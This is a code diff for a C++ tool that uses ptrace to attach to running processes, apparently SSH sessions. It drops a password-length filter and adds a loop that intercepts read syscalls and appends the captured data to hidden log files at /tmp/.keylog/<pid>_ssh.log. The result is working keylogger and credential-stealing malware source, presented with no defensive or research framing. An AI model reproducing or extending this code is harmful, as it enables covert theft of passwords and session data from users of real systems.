@@ -105,7 +105,7 @@ namespace ptrace_ns{
         std::fclose(fd);
     }*/
 
-    void ptrace_loop(pid_t traced_process) {
+    void ptrace_loop_incoming(pid_t traced_process) {
         char *write_string = nullptr;
         int status = 0;
         int syscall = 0;
@@ -141,9 +141,54 @@ namespace ptrace_ns{
             if (syscall == SYSCALL_write) {
                 length = get_reg(traced_process, eax);
                 assert(errno == 0);
-                if (length <= 0 || length > MAX_PASSWORD_LEN)
-                    continue;
+                write_string = extract_write_string(traced_process, length);
+                find_data_to_log(write_string, length, fd);
+                free(write_string);
+            }
+        }
+        ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
+        DEBUG_STDOUT("[PTRACE] Connection is closed from PID = " + std::to_string(traced_process));
+        HandledProcesses& current_proc_list = HandledProcesses::getInstance();
+        current_proc_list.del_from_proc_list(traced_process);
+        std::fclose(fd);
+    }
 
+    void ptrace_loop_outgoing(pid_t traced_process) {
+        char *write_string = nullptr;
+        int status = 0;
+        int syscall = 0;
+        long length = 0;
+        struct user_regs_struct regs{};
+        memset(&regs, 0, sizeof(regs));
+
+        fs::path log_filename = "/tmp/.keylog";
+        log_filename /= std::to_string(traced_process) + "_ssh.log";
+        FILE *fd = std::fopen(log_filename.c_str(), "a+");
+        if(!fd){
+            auto log_string = std::string{"Log-file error: "} + log_filename.string();
+            DEBUG_STDERR(log_string);
+            return;
+        }
+        DEBUG_STDOUT("[PTRACE] Starting attach pid: " + std::to_string(traced_process));
+        if(ptrace(PTRACE_ATTACH, traced_process, NULL, &regs) == -1) return;
+        if(waitpid(traced_process, &status, 0) == -1) return;
+
+        if (!WIFSTOPPED(status)) {
+            ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
+            return;
+        }
+
+        ptrace(PTRACE_SETOPTIONS, traced_process, 0, 0x00000001);
+
+        while(true) {
+            if (wait_for_syscall(traced_process) != 0)
+                break;
+            syscall = get_syscall(traced_process);
+            if (wait_for_syscall(traced_process) != 0)
+                break;
+            if (syscall == SYSCALL_read) {
+                length = get_reg(traced_process, eax);
+                assert(errno == 0);
                 write_string = extract_write_string(traced_process, length);
                 find_data_to_log(write_string, length, fd);
                 free(write_string);
